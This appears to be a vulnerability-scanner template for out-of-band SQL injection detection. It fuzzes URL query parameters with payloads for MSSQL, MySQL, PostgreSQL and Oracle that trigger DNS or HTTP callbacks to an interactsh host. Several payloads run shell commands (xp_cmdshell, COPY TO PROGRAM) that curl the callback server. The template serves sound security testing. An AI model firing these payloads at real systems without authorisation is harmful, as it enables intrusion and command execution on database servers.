http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  fuzzing:
  - fuzz:
    - '{{oob_payloads}}'
    mode: single
    part: query
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    oob_payloads:
    - 1; exec master..xp_dirtree '\\{{interactsh-url}}\\abc'--
    - 1; exec master..xp_fileexist '\\{{interactsh-url}}\\abc'--
    - 1; exec master..xp_subdirs '\\{{interactsh-url}}\\abc'--
    - 1; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--
    - 1'; exec master..xp_dirtree '\\{{interactsh-url}}\\abc'--
    - 1'; exec master..xp_fileexist '\\{{interactsh-url}}\\abc'--
    - 1'; exec master..xp_subdirs '\\{{interactsh-url}}\\abc'--
    - 1'; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--
    - 1"; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--
    - 1"; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--
    - 1"; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--
    - 1"; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--
    - 1' UNION SELECT LOAD_FILE('\\{{interactsh-url}}\\abc')-- -
    - 1" UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -
    - 1 UNION SELECT LOAD_FILE('\\{{interactsh-url}}\\abc')-- -
    - 1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--
    - 1'; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--
    - 1"; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--
    - 1 COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--
    - 1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
    - 1; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
    - 1'; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
    - 1'; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
    - 1"; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
    - 1"; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
    - 1 SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--
    - 1 BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--
  stop-at-first-match: true
id: fuzz-oob-all
info:
  author: openai
  name: Universal OOB Fuzzing (MSSQL, MySQL, PostgreSQL, Oracle)
  severity: critical
  tags: dast,oob,sqli,mssql,mysql,postgresql,oracle
